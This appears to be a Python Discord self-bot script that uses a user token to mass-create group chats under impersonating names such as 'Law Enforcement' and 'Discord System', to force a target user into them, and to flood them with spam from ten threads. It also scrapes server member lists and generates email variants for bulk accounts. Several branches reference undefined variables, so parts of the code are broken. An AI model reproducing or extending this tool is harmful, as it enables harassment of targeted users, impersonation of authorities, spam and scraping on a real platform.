import os
os.system("pip install -r requirements.txt")
os.system("cls" if os.name == "nt" else "clear") # if you are running it on windows, it will run the cls command in the terminal to clear it. On Linux it will run the clear command.
import sys
import colorama
import ctypes
import requests
import discum
import json
import time
import random
import threading

developer = "testuser#0001"
# https://patorjk.com/software/taag/#p=display&f=Graffiti&t=Type%20Something%20 => ASCII Art
def logo():
    if os.name == "nt": ctypes.windll.kernel32.SetConsoleTitleW(
        f'[Mass Group Manager] | Ready for use <3')  # windows system
    return (print(f"""{colorama.Fore.RESET}{colorama.Fore.LIGHTMAGENTA_EX}

    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ████████╗ ██████╗  ██████╗ ██╗     ███████╗
    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║       ██║   ██║   ██║██║   ██║██║     ███████╗
    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║       ██║   ██║   ██║██║   ██║██║     ╚════██║
    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝

    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    created by {developer}
    {colorama.Fore.LIGHTCYAN_EX}
    [1] Mass Group Creator
    [2] Mass Member to Group Adder
    [3] Mass Group Name Changer
    [4] Mass Group Icon Changer
    [5] Mass Group Message Sender
    [6] Mass Fetch Members from a Guild
    [7] Generate Tempmails with custom domain
    {colorama.Fore.RESET}
    """))


logo()

option = input(f"{colorama.Fore.LIGHTMAGENTA_EX}    [Final] Select a Option from above: ")
if option != "1" and option != "2" and option != "3" and option != "4" and option != "5" and option != "6" and option != "7":
    print(f"{colorama.Fore.RED}    [!] Invalid Option selected!{colorama.Fore.RESET}"), sys.exit(1337)

# Mass Group Creator
if option == "1":
    def creator():
        with open("config.json") as conf:
            config = json.load(conf)
            token = config["token"]
            image_path = config["icon path"]
            names = [
                "Discord System",
                "Clyde",
                "Official Discord Group",
                "Law Enforcement",
                "Discord Bots",
                "join the crowd",
                "User Agreement",]

        headers = {
            "Authorization": token,
            "accept-language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 OPR/81.0.4196.31"

        }

        while True:
            try:
                r = requests.post('https://discord.com/api/v9/users/@me/channels', headers=headers, json={"recipients": []})
                json_resp = json.loads(r.content)
                group_id = json_resp['id']
                bot = discum.Client(token=token, log={"console": False, "file": False})
                bot.setDmGroupIcon(group_id, image_path)
                time.sleep(0.5)
                response = requests.patch(f'https://discord.com/api/v9/channels/{group_id}', headers=headers,
                                            json={'name': random.choice(names)})

                if response.status_code == 200 or response.status_code == 204 or response.status_code == 201:
                    print(f"{colorama.Fore.LIGHTGREEN_EX}    [+] Group Created! => ID: {json_resp['id']}{colorama.Fore.RESET}")
                else:
                    print(f"{colorama.Fore.LIGHTRED_EX}    [+] Group NOT Created! => HTTP Error: {response.status_code}{colorama.Fore.RESET}")
                with open("group_id.txt", "a") as group_id:
                    group_id.write(json_resp['id'] + '\n')

            except:
                json_resp = r.json()
                print(f"{colorama.Fore.LIGHTRED_EX}    [429] Discord reject requests for {json_resp['retry_after']} Seconds now. I will continue after that time...{colorama.Fore.RESET}")
                time.sleep(json_resp['retry_after'])
                creator()
    creator()

# Mass Member to Group Adder
elif option == "2":
    user_id = input('    Enter User ID: ')
    with open("config.json") as conf:
        config = json.load(conf)
        token = config["token"]

    headers = {
        "Authorization": token,
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 OPR/81.0.4196.31"

    }


    def sendreq():
        with open("group_id.txt") as group_file:
            lines = group_file.readlines()
            for _ in lines:
                rand_line = random.choice(lines)
                with open("log.txt", "a+") as log_file:
                    read_logs = log_file.read()
                check = read_logs.find(rand_line)
                if check != -1:
                    print(f"{colorama.Fore.BLACK}{colorama.Back.YELLOW} User: {user_id} is already in Group")
                    lines.remove(rand_line)
                else:
                    try:
                        with open("log.txt", "a+") as f:
                            f.write(rand_line)
                        group_id = rand_line.strip('\n')
                        response = requests.put(f'https://discord.com/api/v9/channels/{group_id}/recipients/{user_id}', headers=headers)
                        json_resp = json.loads(response.content)
                        if response.status_code == 200 or response.status_code == 204 or response.status_code == 201:
                            lines.remove(rand_line)
                            print(
                                f"{colorama.Fore.LIGHTGREEN_EX}    [+] Requested the API successfully | Group => ID: {group_id} => GroupIDs left: {len(lines)}")

                        elif response.status_code == 429:
                            print(
                                f"{colorama.Fore.LIGHTRED_EX}    [429] Discord reject requests for {json_resp['retry_after']} Seconds now. I will continue after that time...{colorama.Fore.RESET}")
                            time.sleep(json_resp['retry_after'])
                        else:
                            print(
                                f"{colorama.Fore.LIGHTRED_EX}    [+] User NOT Added to Group => HTTP Error: {response.status_code}{colorama.Fore.RESET}")
                    except:
                        print(
                            f"{colorama.Fore.LIGHTRED_EX}    [+] User NOT Added to Group => HTTP Error: {response.status_code}{colorama.Fore.RESET}")


    # changing the value of the variable "th" might cause connection issues and the whole code will run wayyy slower even if you put a higher number.
    # this number do NOT mean the total requests. the number of connections at the same time is meant. the total connections are defined in for line in shit
    # so the total number of connections equals to the lines of the group_id.txt file.
    for _ in range(10):
        t = threading.Thread(target=sendreq)
        t.start()

# Mass Group Name Changer
elif option == "3":
    with open("config.json") as conf:
        config = json.load(conf)
        token = config["token"]

    names = ['github.com/FuckingToasters']  # ADD MORE IF NEEDED
    headers = {
        "Authorization": token,
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 OPR/81.0.4196.31",
        "Content-Type": "application/json"

    }

    def sendreq():
        while True:
            try:
                with open("group_id.txt") as group_file:
                    lines = group_file.readlines()
                    for _ in lines:
                        rand_line = random.choice(lines)
                        group_id = rand_line.strip('\n')
                        response = requests.patch(f'https://discord.com/api/v9/channels/{group_id}', headers=headers, json={'name': random.choice(names)})
                        if response.status_code == 200 or response.status_code == 204 or response.status_code == 201:
                            print(
                                f"{colorama.Fore.LIGHTGREEN_EX}    [+] Requested the API successfully | Group => ID: {group_id} => GroupIDs left: {len(lines)}")
                            lines.remove(rand_line)

                        elif response.status_code == 429:
                            print(
                                f"{colorama.Fore.LIGHTRED_EX}    [429] Discord reject requests for {json_resp['retry_after']} Seconds now. I will continue after that time...{colorama.Fore.RESET}")
                            time.sleep(json_resp['retry_after'])

                        else:
                            print(
                                f"{colorama.Fore.LIGHTRED_EX}    [-] Name of the Group not changed => HTTP Error: {response.status_code}{colorama.Fore.RESET}")
                        print(response.content)
                        print(response)
            except:
                print(
                    f"{colorama.Fore.LIGHTRED_EX}    [-] Name of the Group not changed => HTTP Error: {response.status_code}{colorama.Fore.RESET}")


    for i in range(10):
        t = threading.Thread(target=sendreq)
        t.start()

# Mass Group Icon Changer
elif option == "4":
    with open("config.json") as conf:
        config = json.load(conf)
        token = config["token"]
        image_path = config["icon path"]

    while True:
        try:
            with open("group_id.txt") as group_file:
                for _ in group_file:
                    lines = group_file.readlines()
                    rand_line = random.choice(lines)
                    already_checked = open('log.txt', mode='a+')
                    all_of_it = already_checked.read()
                    check = all_of_it.find(rand_line)
                    if check != -1:
                        pass
                    else:
                        for _ in shit:
                            try:
                                with open("log.txt", "a+") as f:
                                    f.write(rand_line)
                                group_id = rand_line.strip('\n')
                                bot = discum.Client(token=token, log={"console": False, "file": False})
                                bot.setDmGroupIcon(group_id, image_path)
                                time.sleep(random.randint(0, 2))
                                print(
                                    f"{colorama.Fore.LIGHTGREEN_EX}    [+] Changed Group Icon => ID: {group_id}{colorama.Fore.RESET}")

                            except IndexError:
                                print(
                                    f"{colorama.Fore.LIGHTRED_EX}    No GroupID to change the icon to found in log.txt")
                            except:
                                print(f"{colorama.Fore.LIGHTRED_EX}    [-] Group Icon NOT changed to: {image_path}")
        except:
            print(json_resp['retry_after']), time.sleep(json_resp['retry_after'])

# Mass Group Message Sender
elif option == "5":
    # make sure to look at the other files and sometimes you se something around "with open("...txt") as file:"
    # this is defently better then just open(...) as it manage the files automatically and you will not need to close the files manually etc.

    message = input(
        '    Enter your Message to be sent: ')  # note: that Messages will be sent to the same group multiplie times if you choose a higher value then the number of groups you are in.
    message_count = int(input('    Enter Message Count: '))
    with open("config.json") as conf:
        config = json.load(conf)
        token = config["token"]


    def sendreq():
        with open("group_id.txt") as group_file:
            for _ in group_file:
                lines = group_file.readlines()
                rand_line = random.choice(lines)
                with open("log.txt", "a+") as log_file:
                    logs = log_file.read()
                    check = logs.find(rand_line)
                if check != -1:
                    pass
                else:
                    """
                    ==========================================================================================================================================
                    if you want to send messages in a loop, uncomment the 'while True' by removing the '#' and add a '#' at 'for line in range(message_count):'
                    If you use 'while True' messages probably will be sent again in a group, they already where sent in!
                    ==========================================================================================================================================
                    """
                    # while True:
                    for _ in range(message_count):
                        try:
                            with open("log.txt", "a+") as f:
                                f.write(rand_line)
                            group_id = rand_line.strip('\n')

                            headers = {
                                "Authorization": token,
                                "accept-encoding": "gzip, deflate, br",
                                "accept-language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
                                "accept": "*/*",
                                "referer": f"https://discord.com/channels/@me/{channelid}",
                                "host": "discord.com",
                                "connection": "keep-alive",
                                "orgin": "https://discord.com"
                            }

                            data = {
                                "content": message,
                                "tts": False
                            }

                            response = requests.post(f'https://discord.com/api/v9/channels/{group_id}/messages',
                                                     data=data, headers=headers)
                            json_resp = json.loads(response.content)
                            if response.status_code == 200 or response.status_code == 204 or response.status_code == 201: print(
                                f'    {colorama.Fore.LIGHTGREEN_EX}[+] Message Sent To {channelid} {colorama.Fore.RESET}\n')
                            if response.status_code == 429:
                                print(
                                    f"    {colorama.Fore.LIGHTRED_EX}[-] Message Not Sent To {group_id} => Ratelimit for {json_resp['retry_after']} seconds!{colorama.Fore.RESET}")
                                time.sleep(json_resp['retry_after'])

                        except:
                            print(
                                f"    {colorama.Fore.LIGHTRED_EX}[-] Message Not Sent To {group_id} => Ratelimit for {json_resp['retry_after']} seconds!{colorama.Fore.RESET}")
                            time.sleep(json_resp['retry_after'])


    # changing the value of the variable "th" might cause connection issues and the whole code will run wayyy slower even if you put a higher number.
    # this number do NOT mean the total requests. the number of connections at the same time is meant. the total connections are defined in for line in shit
    # so the total number of connections equals to the lines of the group_id.txt file.
    for i in range(10):
        t = threading.Thread(target=sendreq)
        t.start()

elif option == "6":
    with open("config.json") as conf:
        config = json.load(conf)
        token = config["token"]
    bot = discum.Client(token=token, log={"console": False, "file": False})
    class MemberTracker: members = {}
    mt = MemberTracker()
    # a gateway function
    
    def print_members(resp, guild_id):
        # what discord with to our op14 member subscribe msgs
        with open("members.txt", "a+") as member_file:
            all_members = member_file.read()
            if resp.event.guild_member_list:
                s = bot.gateway.session
                if len(s.guild(guild_id).members) > len(mt.members):
                    mt.members.update(s.guild(guild_id).members)
                    for i in mt.members.values():
                        member_file.write(i["username"] + '#' + i['discriminator'] + '\n')
                        print(i["username"] + '#' + i['discriminator'])
                    # member_file.write(i["username"], i['discriminator'] + '\n')
                    # print(i["username"], i['discriminator'])


    def close_after_fetching(resp, guild_id):
        if bot.gateway.finishedMemberFetching(guild_id):
            length_membersfetched = len(bot.gateway.session.guild(guild_id).members).format(str)
            print(f"{length_membersfetched} members fetched")
            bot.gateway.removeCommand({'function': close_after_fetching, 'params': {'guild_id': guild_id}})
            bot.gateway.close()


    def get_members(guild_id, channel_id):
        bot.gateway.fetchMembers(guild_id, channel_id, keep="all", wait=1)
        bot.gateway.command({'function': close_after_fetching, 'params': {'guild_id': guild_id}})
        bot.gateway.run()
        bot.gateway.resetSession()  # saves 10 seconds when gateway is run again
        return bot.gateway.session.guild(guild_id).members


    guild_id = input("Enter the GuildID: ")
    channel_id = input("Enter the ChannelID: ")
    members = get_members(guild_id, channel_id)

    with open('members.txt', 'a+', encoding='utf-8') as f:
        for m in members.values():
            user = m["username"] + '#' + m['discriminator']
            print(user)
            f.write(user + '\n')

elif option == "7":
    domain = input("    Enter the domain: ")
    generate_mails = lambda symbol: symbol[11:] and [symbol[0] + w + x for x in generate_mails(symbol[1:]) for w in ('.', '')] or [symbol]
    with open("mails.txt", "a+") as file:
        print("    Generating mails...")
        for mail in generate_mails(domain): file.write(f"{mail}\n") # take something@example.com as input
